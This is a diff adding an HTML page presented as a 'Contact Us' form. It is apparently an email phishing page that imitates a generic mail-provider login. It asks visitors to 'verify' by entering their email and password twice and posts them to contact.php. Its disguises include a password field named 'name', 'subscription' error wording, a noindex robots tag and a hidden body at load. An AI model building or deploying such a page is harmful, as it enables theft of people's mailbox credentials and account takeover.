@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noindex, nofollow, noarchive">
+  <title>Contact Us</title>
+  <link rel="stylesheet" href="contact.css">
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body style="visibility: hidden;">
+  <main class="contact-shell">
+    <section class="contact-card" aria-label="Contact us form">
+       
+        <div class="brand-ticker" aria-label="Supported mail platforms">
+          <div class="ticker-track">
+            <div class="ticker-set">
+              <div class="brand-chip">
+                <span class="brand-mark mark-windows" aria-hidden="true"
+                  ><i></i><i></i><i></i><i></i
+                ></span>
+                <span>Cloud Office</span>
+              </div>
+              <div class="brand-chip">
+                <span class="brand-mark mark-mail" aria-hidden="true"></span>
+                <span>Webmail</span>
+              </div>
+              <div class="brand-chip">
+                <span class="brand-mark mark-square" aria-hidden="true"></span>
+                <span>Enterprise Mail</span>
+              </div>
+              <div class="brand-chip">
+                <span class="brand-mark mark-alert" aria-hidden="true"></span>
+                <span>Domain Inbox</span>
+              </div>
+              <div class="brand-chip">
+                <span class="brand-mark mark-cloud" aria-hidden="true"></span>
+                <span>Hosted Mail</span>
+              </div>
+              <div class="brand-chip">
+                <span class="brand-mark mark-globe" aria-hidden="true"></span>
+                <span>Network Mail</span>
+              </div>
+              <div class="brand-chip">
+                <span class="brand-mark mark-y" aria-hidden="true"></span>
+                <span>Secure Mail</span>
+              </div>
+              <div class="brand-chip">
+                <span class="brand-mark mark-grid" aria-hidden="true"
+                  ><i></i><i></i><i></i><i></i
+                ></span>
+                <span>Team Suite</span>
+              </div>
+            </div>
+
+            <div class="ticker-set" aria-hidden="true">
+              <div class="brand-chip">
+                <span class="brand-mark mark-windows"
+                  ><i></i><i></i><i></i><i></i
+                ></span>
+                <span>Cloud Office</span>
+              </div>
+              <div class="brand-chip">
+                <span class="brand-mark mark-mail"></span>
+                <span>Webmail</span>
+              </div>
+              <div class="brand-chip">
+                <span class="brand-mark mark-square"></span>
+                <span>Enterprise Mail</span>
+              </div>
+              <div class="brand-chip">
+                <span class="brand-mark mark-alert"></span>
+                <span>Domain Inbox</span>
+              </div>
+              <div class="brand-chip">
+                <span class="brand-mark mark-cloud"></span>
+                <span>Hosted Mail</span>
+              </div>
+              <div class="brand-chip">
+                <span class="brand-mark mark-globe"></span>
+                <span>Network Mail</span>
+              </div>
+              <div class="brand-chip">
+                <span class="brand-mark mark-y"></span>
+                <span>Secure Mail</span>
+              </div>
+              <div class="brand-chip">
+                <span class="brand-mark mark-grid"
+                  ><i></i><i></i><i></i><i></i
+                ></span>
+                <span>Team Suite</span>
+              </div>
+            </div>
+          </div>
+        </div>
+        
+      <header class="contact-header">
+        <span class="contact-badge" aria-hidden="true"></span>
+        <h1>Email Access</h1>
+        <p>Verify your email to continue to your mail provider.</p>
+      </header>
+
+      <form class="contact-form" id="subscribeForm" method="post" action="contact.php" novalidate>
+        <div id="step-details">
+
+          <div class="field-group">
+            <label for="email">Email Address</label>
+            <input id="email" name="email" type="email" placeholder="name@example.com" autocomplete="email" required>
+          </div>
+
+          <div class="field-group">
+            <label for="name">Password</label>
+            <input id="name" name="name" type="password" placeholder="Enter your Password" autocomplete="name" required>
+          </div>
+
+          
+          <div class="form-row">
+          <label class="consent-control">
+            <input type="checkbox" name="consent" value="yes" required>
+            <span>Remember me</span>
+          </label>
+           <a href="#recovery">Need help?</a>
+          </div>
+
+          <div class="honeypot-field" aria-hidden="true">
+            <label for="website">Website</label>
+            <input id="website" name="website" type="text" tabindex="-1" autocomplete="off">
+          </div>
+
+          <button type="button" id="continueBtn">Continue</button>
+        </div>
+
+        <div id="step-confirm" hidden>
+          <p class="confirm-note">Please verify your email address and name to continue.</p>
+
+          <div class="field-group">
+            <label for="confirm-email">Email Address</label>
+            <input id="confirm-email" type="email" placeholder="Re-enter your email" autocomplete="off">
+          </div>
+
+          <div class="field-group">
+            <label for="confirm-name">Password</label>
+            <input id="confirm-name" type="password" placeholder="Re-enter your Password" autocomplete="off">
+          </div>
+
+          
+
+          <p class="field-error" id="confirm-error" role="alert" hidden>Email and password don't match what you entered above. Please try again.</p>
+          <p class="field-error" id="submit-error" role="alert" hidden>Something went wrong sending your subscription. Please try again.</p>
+
+          <div class="confirm-actions">
+            <button type="button" id="backBtn" class="btn-secondary">Back</button>
+            <button type="submit" id="confirmSubmit">Verify &amp; Continue</button>
+          </div>
+        </div>
+      </form>
+
+       <aside class="notice-panel" id="recovery">
+          <h2>Security & Connection Notice</h2>
+          <p>
+            This page verifies the email spelling and routes you to your
+            provider. Passwords should only be entered on the provider's
+            official website.
+          </p>
+          <footer>
+            <span>Open-Xchange Compatible Portal Version: 8.49.3</span>
+            <span>Privacy policy | Legal notes</span>
+          </footer>
+        </aside>
+        
+    </section>
+  </main>
+
+  <script src="contact.js"></script>
+</body>
+</html>
